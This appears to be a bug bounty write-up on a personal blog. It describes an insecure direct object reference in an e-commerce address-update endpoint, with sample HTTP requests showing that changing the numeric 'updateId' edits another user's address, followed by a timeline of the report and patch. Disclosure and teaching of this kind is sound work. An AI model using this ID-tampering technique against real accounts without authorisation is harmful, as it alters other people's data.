---
layout: post
title: How I was able to update any user's address
---
## Overview

It was the same program as [How I bypassed OTP mechanism used for updating Sensitive Information](https://vj0shii.github.io/bypass-otp-mechanism-on-updating-sensitive-information/)

## Scenario

There was a Address book section inside the application where the user can add a number of addresses for the product delivery<!--more-->, whenever a user adds a new address to his/her account there is a id alloted to that which was in simple numeric format, when a user updates the address, the id is sent with the request and the address is updated, `updateid` parameter in below request

**Address Update Request**

```
POST /customer/EditAddress/ HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 288
Connection: close
Cookie: --COOKIES--

csrf_token=--CSRFTOKEN--&updateId=1234567&submit_address=Save+Address&postcode=560025&firstname=Overtake&lastname=nk&mobile=1223456789&street=ZmtzbnZhag%3D%3D&street1=fjkwbjkwb&landmark=jbkjb&city=Bengaluru&region=Karnataka&country_id=IN
```

## Where is the problem in this flow

The problem occurs when the address is just updated on the basis of the ID number which can be tampered from client side, the application was not validating that if the user has access to update the address with that ID and trusts the user input and updates it

## Exploitation

I created two test accounts test1 & test2, let's say the address_id for user test1 is 1111111 & for user test2 it is 2222222, go to the address book in test1 account, clicked on edit button, filled the update form and clicked on Save then intercepted the request with burp suite

**Original Request**

```
POST /customer/EditAddress/ HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 288
Connection: close
Cookie: --COOKIES--

csrf_token=--CSRFTOKEN--&updateId=1111111&submit_address=Save+Address&postcode=123456&firstname=Overtake&lastname=Test&mobile=1223456789&street=Test&street1=Test&landmark=jbkjb&city=Test&region=Test&country_id=IN
```

I tampered the request and changed the  `updateid` parameter value to 2222222

**Modified Request**

```
POST /customer/EditAddress/ HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 288
Connection: close
Cookie: --COOKIES--

csrf_token=--CSRFTOKEN--&updateId=222222&submit_address=Save+Address&postcode=123456&firstname=Overtake&lastname=Test&mobile=1223456789&street=Test&street1=Test&landmark=jbkjb&city=Test&region=Test&country_id=IN
```

Then check the address in test2 Address book, the address of test2 account is updated

The bug was reported to the team and patched successfully

**Time Frame**

Initial Report: 26-May-2020

First Response: 27-May-2020

Patch Released: 2-June-2020
